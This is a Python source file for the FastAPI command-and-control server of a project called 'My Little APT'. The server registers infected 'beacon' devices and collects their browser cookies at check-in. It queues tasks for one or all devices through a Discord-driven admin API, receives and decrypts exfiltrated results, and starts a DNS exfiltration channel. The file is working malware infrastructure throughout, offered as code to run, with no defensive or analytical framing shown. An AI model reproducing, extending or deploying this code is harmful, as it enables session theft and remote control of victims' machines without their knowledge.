"""
C2 Server — FastAPI application.
Acts as the intermediary between the Discord bot (admin panel) and the
client app (beacon). The bot communicates with the server via HTTP endpoints.
"""

import logging
from contextlib import asynccontextmanager
from datetime import datetime, timezone

from fastapi import FastAPI, HTTPException, status
from pydantic import BaseModel

from command_handler import CommandHandler
from config import DNS_LISTENER_PORT, SERVER_HOST, SERVER_PORT, VALID_BEACON_INTERVALS
from models import (
    BeaconCheckIn,
    DeviceInfo,
    TaskResult,
)

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("c2-server")

# ---------------------------------------------------------------------------
# Shared instances
# ---------------------------------------------------------------------------

handler = CommandHandler()

# ---------------------------------------------------------------------------
# Lifespan: start DNS listener alongside FastAPI
# ---------------------------------------------------------------------------


@asynccontextmanager
async def lifespan(app: FastAPI):  # type: ignore[type-arg]
    """Start background services on startup."""
    try:
        from dns_server import start_dns_server
        start_dns_server(handler, port=DNS_LISTENER_PORT)
    except ImportError:
        logger.warning("dnslib not installed — DNS exfiltration channel disabled.")
    yield


# ---------------------------------------------------------------------------
# FastAPI app
# ---------------------------------------------------------------------------

app = FastAPI(
    title="My Little APT — C2 Server",
    description="Command-and-control backend for the my-little-apt project.",
    version="0.3.0",
    lifespan=lifespan,
)


# ---------------------------------------------------------------------------
# Request models for admin endpoints
# ---------------------------------------------------------------------------

class SetBeaconIntervalRequest(BaseModel):
    """Payload for updating the beacon interval."""
    interval: int


class SetProtocolRequest(BaseModel):
    """Payload for updating the communication protocol."""
    protocol: str


class QueueTaskRequest(BaseModel):
    """Payload for queuing a task to a device."""
    device_name: str  # use "*" for all devices
    task_type: str
    parameters: dict = {}


# ---------------------------------------------------------------------------
# Health
# ---------------------------------------------------------------------------

@app.get("/health", tags=["health"])
async def health_check() -> dict:
    """Basic health check endpoint."""
    return {
        "status": "healthy",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "config": {
            "beacon_interval": handler.server_config.beacon_interval,
            "communication_protocol": handler.server_config.communication_protocol,
        },
    }


# ---------------------------------------------------------------------------
# Admin endpoints (called by the Discord bot via HTTP)
# ---------------------------------------------------------------------------

@app.get("/admin/devices", tags=["admin"])
async def admin_show_devices() -> dict:
    """Return the list of managed devices."""
    device_list = [
        {
            "name": d.name,
            "ip": d.ip,
            "status": d.status,
            "last_seen": d.last_seen.isoformat(),
        }
        for d in handler.devices.values()
    ]
    return {
        "status": "success",
        "data": {"devices": device_list},
        "message": f"Found {len(device_list)} device(s)",
    }


@app.get("/admin/cookies", tags=["admin"])
async def admin_request_cookies() -> dict:
    """Collect and return cookies from all devices."""
    all_cookies: dict[str, dict[str, str]] = {}
    for device in handler.devices.values():
        if device.cookies:
            all_cookies[device.name] = device.cookies

    total = sum(len(c) for c in all_cookies.values())
    return {
        "status": "success",
        "data": {"cookies_by_device": all_cookies},
        "message": f"Retrieved {total} cookie(s) from {len(all_cookies)} device(s)",
    }


@app.get("/admin/results", tags=["admin"])
async def admin_results() -> dict:
    """Return the latest exfiltrated result for each task type per device."""
    results_by_device: dict[str, dict] = {}
    for device in handler.devices.values():
        if device.results:
            results_by_device[device.name] = device.results

    total = sum(len(r) for r in results_by_device.values())
    return {
        "status": "success",
        "data": {"results_by_device": results_by_device},
        "message": f"{total} result(s) across {len(results_by_device)} device(s)",
    }


@app.post("/admin/beacon-interval", tags=["admin"])
async def admin_set_beacon_interval(body: SetBeaconIntervalRequest) -> dict:
    """Update the beacon interval."""
    if body.interval not in VALID_BEACON_INTERVALS:
        allowed = ", ".join(str(v) for v in VALID_BEACON_INTERVALS)
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=f"Invalid beacon interval {body.interval}. Allowed: {allowed}",
        )

    handler.server_config.beacon_interval = body.interval
    logger.info("Beacon interval updated to %d seconds", body.interval)
    return {
        "status": "success",
        "data": {"beacon_interval": body.interval},
        "message": f"Beacon interval set to {body.interval} seconds",
    }


@app.post("/admin/communication-protocol", tags=["admin"])
async def admin_set_protocol(body: SetProtocolRequest) -> dict:
    """Update the communication protocol."""
    from config import VALID_COMMUNICATION_PROTOCOLS

    protocol_lower = body.protocol.lower()
    if protocol_lower not in VALID_COMMUNICATION_PROTOCOLS:
        allowed = ", ".join(VALID_COMMUNICATION_PROTOCOLS)
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=f"Invalid protocol '{body.protocol}'. Allowed: {allowed}",
        )

    handler.server_config.communication_protocol = protocol_lower
    logger.info("Communication protocol updated to %s", protocol_lower)
    return {
        "status": "success",
        "data": {"communication_protocol": protocol_lower},
        "message": f"Communication protocol set to {protocol_lower}",
    }


# ---------------------------------------------------------------------------
# Beacon endpoints (client → server)
# ---------------------------------------------------------------------------

@app.post(
    "/beacon/check-in",
    tags=["beacon"],
    status_code=status.HTTP_200_OK,
)
async def beacon_check_in(payload: BeaconCheckIn) -> dict:
    """
    Beacon registers or updates its presence.
    Returns the current server configuration so the client knows the
    expected interval and protocol for the next exfiltration.
    """
    device = DeviceInfo(
        name=payload.device_name,
        ip=payload.ip_address,
        os_info=payload.os_info,
        status="online",
        cookies=payload.cookies,
        last_seen=datetime.now(timezone.utc),
    )
    handler.register_device(device)
    return {
        "status": "registered",
        "beacon_interval": handler.server_config.beacon_interval,
        "communication_protocol": handler.server_config.communication_protocol,
    }


@app.get("/beacon/tasks/{device_name}", tags=["beacon"])
async def beacon_get_tasks(device_name: str) -> dict:
    """
    Beacon polls for pending tasks.
    Dequeues and returns any tasks queued for the requesting device (fire-once).
    """
    device = handler.get_device(device_name)
    if device is None:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail=f"Device '{device_name}' is not registered. "
                   f"Call /beacon/check-in first.",
        )

    device.last_seen = datetime.now(timezone.utc)
    tasks = handler.dequeue_tasks(device_name)

    return {
        "device": device_name,
        "tasks": [t.model_dump() for t in tasks],
        "beacon_interval": handler.server_config.beacon_interval,
    }


@app.post("/beacon/result", tags=["beacon"])
async def beacon_submit_result(result: TaskResult) -> dict:
    """Beacon submits the result of a completed task."""
    device = handler.get_device(result.device_name)
    if device is None:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail=f"Device '{result.device_name}' is not registered.",
        )

    data = dict(result.data)

    # Decrypt AES-encrypted payload if flagged.
    if result.encrypted and "output" in data:
        try:
            from crypto import decrypt
            data["output"] = decrypt(str(data["output"]))
        except Exception as exc:
            logger.warning("Failed to decrypt result for task %s: %s", result.task_id, exc)

    handler.store_result(
        task_id=result.task_id,
        device_name=result.device_name,
        data=data,
        success=result.success,
    )
    logger.info(
        "Task result from %s (task_id=%s, success=%s)",
        result.device_name,
        result.task_id,
        result.success,
    )
    return {"status": "accepted", "task_id": result.task_id}


@app.get("/beacon/config", tags=["beacon"])
async def beacon_get_config() -> dict:
    """Return the current server configuration for beacons."""
    return {
        "beacon_interval": handler.server_config.beacon_interval,
        "communication_protocol": handler.server_config.communication_protocol,
        "valid_intervals": VALID_BEACON_INTERVALS,
    }


# ---------------------------------------------------------------------------
# Admin task queue endpoints
# ---------------------------------------------------------------------------

@app.post("/admin/queue-task", tags=["admin"])
async def admin_queue_task(body: QueueTaskRequest) -> dict:
    """
    Queue a task for a device (or all devices if device_name is '*').
    The task will be picked up on the device's next /beacon/tasks poll.
    """
    if body.device_name == "*":
        tasks = handler.queue_task_for_all(body.task_type, body.parameters)
        return {
            "status": "success",
            "data": {
                "tasks_queued": len(tasks),
                "device_count": len(tasks),
            },
            "message": f"Queued '{body.task_type}' for {len(tasks)} device(s)",
        }

    device = handler.get_device(body.device_name)
    if device is None:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail=f"Device '{body.device_name}' is not registered.",
        )

    task = handler.queue_task(body.device_name, body.task_type, body.parameters)
    return {
        "status": "success",
        "data": {
            "task_id": task.task_id,
            "device": body.device_name,
            "task_type": body.task_type,
        },
        "message": f"Task '{body.task_type}' queued for {body.device_name}",
    }


@app.get("/admin/pending-tasks", tags=["admin"])
async def admin_pending_tasks() -> dict:
    """Return a summary of all pending tasks across all devices."""
    pending = handler.all_pending_tasks()
    total = sum(pending.values())
    return {
        "status": "success",
        "data": {"pending_by_device": pending},
        "message": f"{total} task(s) pending across {len(pending)} device(s)",
    }


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import uvicorn

    uvicorn.run(
        "server:app",
        host=SERVER_HOST,
        port=SERVER_PORT,
        reload=True,
    )
